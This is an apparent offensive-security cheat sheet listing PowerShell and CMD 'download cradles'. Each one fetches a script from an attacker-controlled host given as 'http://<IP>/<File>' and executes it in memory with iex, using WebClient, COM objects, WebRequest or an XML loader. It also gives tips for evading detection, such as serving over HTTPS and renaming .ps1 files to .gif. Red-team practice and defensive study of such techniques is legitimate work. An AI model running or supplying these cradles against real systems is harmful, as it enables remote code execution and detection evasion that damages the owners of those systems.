# Download and Execution Methods

## Tools

[https://github.com/danielbohannon/Invoke-CradleCrafter](https://github.com/danielbohannon/Invoke-CradleCrafter)



In Memory

```
Net.WebClient DownloadString Method
Net.WebClient DownloadData Method
Net.WebClient OpenRead Method
.NET [Net.HttpWebReqest].class
Word.Application COM Object
Excel.Application COM Object
InternetExplorer.Application COM Object
MSXML2.ServerXmlHTTP Com Object
Certutil.exe w/ -ping argument
```

{% hint style="info" %}
If possible use SSL on attacking machine and use HTTPS to further evade detection
{% endhint %}

{% hint style="info" %}
Further evade detection by renaming scripts from .ps1 to something else such as .gif. Powershell can still execute .gif files as Powershell files.
{% endhint %}

{% hint style="info" %}
Multi command scripts below can be converted to one line with ';' between commands.
{% endhint %}

**On Disk**

```
Net.WebClient DownloadFile Method
BITSAdmin.exe
Cerutil.exe w/ -urlcahche argument
```

**Net.WebClient Download String Method**

{% tabs %}
{% tab title="Powershell" %}
```powershell
# Standard download cradle
iex (New-Object Net.Webclient).DownloadString("http://<IP>/<File>")

# Internet Explorer Downoad cradle
$ie=New-Object -ComObject
InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://<IP>/<File>
');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response

# Requires PowerShell V3+
iex (iwr 'http://<IP>/<File>')

$h=New-Object -ComObject
Msxml2.XMLHTTP;$h.open('GET','http://<IP>/<File>',$false);$h.send();iex
$h.responseText

$wr = [System.NET.WebRequest]::Create("http://<IP>/<File>")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```
{% endtab %}

{% tab title="CMD" %}
```batch
powershell.exe iex (New-Object Net.Webclient).DownloadString('http://<IP>/<File>')
```
{% endtab %}
{% endtabs %}

**Net.WebClient Single Quotes Download and store**

{% tabs %}
{% tab title="Powershell" %}
```markup
iex (new-Object Net.WebClient).DownloadFile('http://<IP>/<File>', 'C:\programdata\<File>')
```
{% endtab %}

{% tab title="CMD" %}
```
powershell.exe iex (new-Object Net.WebClient).DownloadFile('http://<IP>/<File>', 'C:\programdata\<File>')
```
{% endtab %}
{% endtabs %}

**Net.WebClient User Agent Download**

```
$downloader = New-Object System.Net.WebClient
$downloader.Headers.Add ("")
$payload = "http://<IP>/<File>"
$command = $downloader.DownloadString($payload)
iex $command
```

## XML Download and execute.

```aspnet
$xmldoc = New-Object System.Xml.XmlDocument
$xmldoc.Load("http://<IP>/<File.xml>")
iex $xmldoc.command.a.execute
```

### One Line

```markup
$xmldoc = New-Object System.Xml.XmlDocument ; $xmldoc.Load("http://<IP>/<File.xml>") ; iex $xmldoc.command.a.execute
```

### Script Example

{% tabs %}
{% tab title="Execute.xml" %}
```markup
<?xml version="1.0"?>
<command>
		<a>
			<execute>Get-Process</execute>
		</a>
</command>
```
{% endtab %}
{% endtabs %}
